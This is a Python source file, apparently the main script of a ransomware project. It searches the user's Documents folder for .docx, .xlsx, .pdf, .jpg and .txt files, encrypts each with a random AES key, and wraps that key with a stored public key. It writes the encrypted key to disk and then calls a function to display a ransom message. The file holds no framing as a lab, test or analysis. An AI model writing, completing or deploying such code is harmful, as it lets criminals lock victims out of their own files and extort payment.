import os
import secrets
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from src.utils.encryption_utils import load_public_key, encrypt_aes_key
from src.utils.file_handling import find_files, encrypt_file, display_ransom_message

def main():
    target_directory = os.path.join(os.getenv('USERPROFILE'), 'Documents')
    extensions = ['.docx', '.xlsx', '.pdf', '.jpeg', '.jpg', '.txt']
    files = find_files(target_directory, extensions)
    
    aes_key = secrets.token_bytes(32)  # Genera una clave AES aleatoria
    public_key = load_public_key(os.path.abspath("../../resources/public_key.pem"))
    
    for file in files:
        encrypt_file(file, aes_key)
    
    encrypted_aes_key = encrypt_aes_key(aes_key, public_key)
    with open('encrypted_aes_key.bin', 'wb') as key_file:
        key_file.write(encrypted_aes_key)
    
    display_ransom_message()

if __name__ == "__main__":
    main()
